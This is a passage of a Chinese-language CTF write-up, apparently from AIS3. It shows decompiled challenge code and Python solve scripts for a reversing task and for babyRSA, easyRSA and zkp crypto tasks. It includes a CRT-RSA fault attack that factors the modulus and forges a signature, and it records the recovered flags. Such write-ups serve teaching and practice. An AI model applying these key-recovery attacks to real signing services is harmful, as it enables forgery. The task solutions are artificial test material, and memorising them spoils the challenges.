class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar2 = <span class="built_in">strncmp</span>(buffer1,<span class="string">&quot;MZRERYND&quot;</span>,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      iVar2 = <span class="built_in">strncmp</span>(buffer2,<span class="string">&quot;RUYODBAH&quot;</span>,<span class="number">8</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">        iVar2 = <span class="built_in">strncmp</span>(buffer3,<span class="string">&quot;BKEMPBRE&quot;</span>,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Yes! I remember now, this is it!&quot;</span>);</span><br><span class="line">          <span class="keyword">goto</span> LAB_08049869;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It feels slightly wrong, but almost correct...&quot;</span>);</span><br><span class="line">LAB_08049869:</span><br><span class="line">  <span class="built_in">free</span>(buffer0);</span><br><span class="line">  <span class="built_in">free</span>(buffer1);</span><br><span class="line">  <span class="built_in">free</span>(buffer2);</span><br><span class="line">  <span class="built_in">free</span>(buffer3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，<code>xor_strings</code>就真的是xor兩個字串，再去看<code>complex_function</code><br><strong>complex_function()</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">complex_function</span><span class="params">(<span class="type">int</span> param_1,<span class="type">int</span> param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ((<span class="number">0x40</span> &lt; param_1) &amp;&amp; (param_1 &lt; <span class="number">0x5b</span>)) &#123;</span><br><span class="line">    local_10 = (param_1 + <span class="number">-0x41</span> + param_2 * <span class="number">0x11</span>) % <span class="number">0x1a</span>;</span><br><span class="line">    iVar1 = param_2 % <span class="number">3</span> + <span class="number">3</span>;</span><br><span class="line">    param_2 = param_2 % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (param_2 == <span class="number">2</span>) &#123;</span><br><span class="line">      local_10 = ((local_10 - iVar1) + <span class="number">0x1a</span>) % <span class="number">0x1a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (param_2 &lt; <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (param_2 == <span class="number">0</span>) &#123;</span><br><span class="line">        local_10 = (local_10 * iVar1 + <span class="number">7</span>) % <span class="number">0x1a</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (param_2 == <span class="number">1</span>) &#123;</span><br><span class="line">        local_10 = (iVar1 * <span class="number">2</span> + local_10) % <span class="number">0x1a</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> local_10 + <span class="number">0x41</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It feels slightly wrong, but almost correct...&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最後，把<code>complex_function</code>寫成py，暴力炸出每一位後再把資料段挖出來做xor就結束~<br><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_function</span>(<span class="params">a1, a2</span>):</span><br><span class="line">    v8 = (<span class="number">17</span> * a2 + a1 - <span class="number">65</span>) % <span class="number">26</span></span><br><span class="line">    v7 = a2 % <span class="number">3</span> + <span class="number">3</span></span><br><span class="line">    v2 = a2 % <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span> a2 % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">        v8 = (v8 - v7 + <span class="number">26</span>) % <span class="number">26</span></span><br><span class="line">    <span class="keyword">elif</span> v2 &lt;= <span class="number">2</span>: </span><br><span class="line">        <span class="keyword">if</span> v2:</span><br><span class="line">            <span class="keyword">if</span> v2 == <span class="number">1</span>:</span><br><span class="line">                v8 = (<span class="number">2</span> * v7 + v8) % <span class="number">26</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v8 = (v7 * v8 + <span class="number">7</span>) % <span class="number">26</span></span><br><span class="line">    <span class="keyword">return</span> v8 + <span class="number">65</span></span><br><span class="line"></span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line"></span><br><span class="line">key1=long_to_bytes(<span class="number">0x0E0D7D060F177604</span>)</span><br><span class="line">key2=long_to_bytes(<span class="number">0x6D001B7C6C136211</span>)</span><br><span class="line">key3=long_to_bytes(<span class="number">0X1E7E061307660E71</span>)</span><br><span class="line">key4=long_to_bytes(<span class="number">0X17141D7079677433</span>)</span><br><span class="line">key=key1+key2+key3+key4</span><br><span class="line"></span><br><span class="line">ans1=<span class="string">&quot;DHLIYJEG&quot;</span></span><br><span class="line">ans2=<span class="string">&quot;MZRERYND&quot;</span></span><br><span class="line">ans3=<span class="string">&quot;RUYODBAH&quot;</span></span><br><span class="line">ans4=<span class="string">&quot;BKEMPBRE&quot;</span></span><br><span class="line">ans=[ans1, ans2, ans3, ans4]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">            <span class="keyword">if</span> complex_function(k, i+j*<span class="number">32</span>)==<span class="built_in">ord</span>(ans[j][i]):</span><br><span class="line">                flag[i+j*<span class="number">8</span>]=k</span><br><span class="line"><span class="comment">#                print(xor(flag, 0))</span></span><br><span class="line"><span class="comment">#                print(xor(flag, key))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;AIS3&#123;G0D&#x27;</span>+xor(flag, key))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Flag:AIS3{G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!}</p>
</blockquote>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h4><p><strong>babyRSA.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_keypair</span>(<span class="params">keysize</span>):</span><br><span class="line">    p = getPrime(keysize)</span><br><span class="line">    q = getPrime(keysize)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    e = random.randrange(<span class="number">1</span>, phi)</span><br><span class="line">    g = gcd(e, phi)</span><br><span class="line">    <span class="keyword">while</span> g != <span class="number">1</span>:</span><br><span class="line">        e = random.randrange(<span class="number">1</span>, phi)</span><br><span class="line">        g = gcd(e, phi)</span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">    <span class="keyword">return</span> ((e, n), (d, n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">pk, plaintext</span>):</span><br><span class="line">    key, n = pk</span><br><span class="line">    cipher = [<span class="built_in">pow</span>(<span class="built_in">ord</span>(char), key, n) <span class="keyword">for</span> char <span class="keyword">in</span> plaintext]</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">pk, ciphertext</span>):</span><br><span class="line">    key, n = pk</span><br><span class="line">    plain = [<span class="built_in">chr</span>(<span class="built_in">pow</span>(char, key, n)) <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(plain)</span><br><span class="line"></span><br><span class="line">public, private = generate_keypair(<span class="number">512</span>)</span><br><span class="line">encrypted_msg = encrypt(public, flag)</span><br><span class="line">decrypted_msg = decrypt(private, encrypted_msg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Key:&quot;</span>, public)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted:&quot;</span>, encrypted_msg)</span><br><span class="line"><span class="comment"># print(&quot;Decrypted:&quot;, decrypted_msg)</span></span><br></pre></td></tr></table></figure>
<p>簡單觀察，會發現對於每個字母c，都有唯一對應的名文，所以先枚舉0~255的case建表以後再把output轉回去就好。  </p>
<p><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e, n=(<span class="number">64917055846592305247490566318353366999709874684278480849508851204751189365198819392860386504785643859.</span>..</span><br><span class="line">table=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    table[<span class="built_in">pow</span>(i, e, n)]=i</span><br><span class="line">enc=[<span class="number">595829831363684348568167997333134467464337960343847242211744244649697378748021161293486079793280988417.</span>..</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(table[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Flag:AIS3{NeverUseTheCryptographyLibraryImplementedYourSelf}</p>
</blockquote>
<h4 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h4><p><strong>easyRSA.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alarm</span>(<span class="params">second</span>):</span><br><span class="line">    <span class="comment"># This is just for timeout.</span></span><br><span class="line">    <span class="comment"># It should not do anything else with the challenge.</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">signum, frame</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Timeout!&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    signal.signal(signal.SIGALRM, handler)</span><br><span class="line">    signal.alarm(second)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_keypair</span>(<span class="params">keysize</span>):</span><br><span class="line">    p = getPrime(keysize)</span><br><span class="line">    q = getPrime(keysize)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    e = random.randrange(<span class="number">1</span>, phi)</span><br><span class="line">    g = gcd(e, phi)</span><br><span class="line">    <span class="keyword">while</span> g != <span class="number">1</span>:</span><br><span class="line">        e = random.randrange(<span class="number">1</span>, phi)</span><br><span class="line">        g = gcd(e, phi)</span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">    <span class="comment"># for CRT optimize</span></span><br><span class="line">    dP = d % (p-<span class="number">1</span>)</span><br><span class="line">    dQ = d % (q-<span class="number">1</span>)</span><br><span class="line">    qInvP = <span class="built_in">pow</span>(q, -<span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">return</span> ((e, n), (dP, dQ, qInvP, p, q))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">pk, message: <span class="built_in">bytes</span>, signature: <span class="built_in">bytes</span></span>):</span><br><span class="line">    e, n = pk</span><br><span class="line">    data = bytes_to_long(sha256(message).digest())</span><br><span class="line">    <span class="keyword">return</span> data == <span class="built_in">pow</span>(bytes_to_long(signature), e, n)</span><br><span class="line"></span><br><span class="line">bug = <span class="keyword">lambda</span> : random.randrange(<span class="number">0</span>, <span class="number">256</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">sk, message: <span class="built_in">bytes</span></span>):</span><br><span class="line">    dP, dQ, qInvP, p, q = sk</span><br><span class="line">    data = bytes_to_long(sha256(message).digest())</span><br><span class="line">    <span class="comment"># use CRT optimize to sign the signature,</span></span><br><span class="line">    <span class="comment"># but there are bugs in my code QAQ</span></span><br><span class="line">    a = bug()</span><br><span class="line">    mP = <span class="built_in">pow</span>(data, dP, p) ^ a</span><br><span class="line">    b = bug()</span><br><span class="line">    mQ = <span class="built_in">pow</span>(data, dQ, q) ^ b</span><br><span class="line">    k = (qInvP * (mP - mQ)) % p</span><br><span class="line">    signature = mQ + k * q</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(signature)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    alarm(<span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">    public, private = generate_keypair(<span class="number">512</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">***********************************************************</span></span><br><span class="line"><span class="string">Have you heard CRT optimization for RSA? I have implemented</span></span><br><span class="line"><span class="string">a CRT-RSA signature. However, there are bugs in my code...</span></span><br><span class="line"><span class="string">---------------------------------------------------------</span></span><br><span class="line"><span class="string">1) Print public key.</span></span><br><span class="line"><span class="string">2) Sign a message.</span></span><br><span class="line"><span class="string">3) Give me flag?</span></span><br><span class="line"><span class="string">4) Bye~</span></span><br><span class="line"><span class="string">***********************************************************</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            option = <span class="built_in">input</span>(<span class="string">&quot;Option: &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(option) == <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;My public key:&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;e, n = <span class="subst">&#123;public&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">int</span>(option) == <span class="number">2</span>:</span><br><span class="line">                message = <span class="built_in">input</span>(<span class="string">&quot;Your message (In Base64 encoded): &quot;</span>)</span><br><span class="line">                message = b64decode(message.encode())</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> message: </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;No, I cannot give you the flag!&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    signature = sign(private, message)</span><br><span class="line">                    signature = b64encode(signature)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Signature: <span class="subst">&#123;signature&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">int</span>(option) == <span class="number">3</span>:</span><br><span class="line">                signature = <span class="built_in">input</span>(<span class="string">&quot;Your signature (In Base64 encoded): &quot;</span>)</span><br><span class="line">                signature = b64decode(signature.encode())</span><br><span class="line">                message = b64encode(<span class="string">b&quot;Give me the flag!&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> verify(public, message, signature):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Well done! Here is your flag :<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span> :</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Invalid signature.&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Bye~~~~~&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Something wrong?&quot;</span>)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<p>重點觀察<code>sign()</code>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">sk, message: <span class="built_in">bytes</span></span>):</span><br><span class="line">    dP, dQ, qInvP, p, q = sk</span><br><span class="line">    data = bytes_to_long(sha256(message).digest())</span><br><span class="line">    <span class="comment"># use CRT optimize to sign the signature,</span></span><br><span class="line">    <span class="comment"># but there are bugs in my code QAQ</span></span><br><span class="line">    a = bug()</span><br><span class="line">    mP = <span class="built_in">pow</span>(data, dP, p) ^ a</span><br><span class="line">    b = bug()</span><br><span class="line">    mQ = <span class="built_in">pow</span>(data, dQ, q) ^ b</span><br><span class="line">    k = (qInvP * (mP - mQ)) % p</span><br><span class="line">    signature = mQ + k * q</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(signature)</span><br></pre></td></tr></table></figure>
<p>兩次丟一樣的東西進去的結果會不一樣(因為有<code>bug()</code>)，但因為<code>bug()</code>的值不大，導致兩次結果會十分接近，並且<code>k</code>值很高機率不同，所以可以嘗試兩者相減後減1~256的結果與n的最大公因數，大於1者即找到<code>q</code>的值。<br><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">n=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;n:&#x27;</span>))</span><br><span class="line">e=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;e:&#x27;</span>))</span><br><span class="line">c1=bytes_to_long(b64decode(<span class="built_in">input</span>(<span class="string">&#x27;c1:&#x27;</span>)))</span><br><span class="line">c2=bytes_to_long(b64decode(<span class="built_in">input</span>(<span class="string">&#x27;c2:&#x27;</span>)))</span><br><span class="line">diff=<span class="built_in">abs</span>(c1-c2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> math.gcd(diff-i, n) &gt; <span class="number">1</span>:</span><br><span class="line">        q=math.gcd(diff-i, n)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">p=n//q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e, phi)</span><br><span class="line">data=b64encode(<span class="string">b&quot;Give me the flag!&quot;</span>)</span><br><span class="line">data=bytes_to_long(sha256(data).digest())</span><br><span class="line">data=long_to_bytes(<span class="built_in">pow</span>(data, d, n))</span><br><span class="line"><span class="built_in">print</span>(b64encode(data))</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/BJqQ6iWNA.png" alt="image">  </p>
<blockquote>
<p>Flag:AIS3{IJustWantItFasterQAQ}</p>
</blockquote>
<h4 id="zkp"><a href="#zkp" class="headerlink" title="zkp"></a>zkp</h4><p><strong>zkp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> 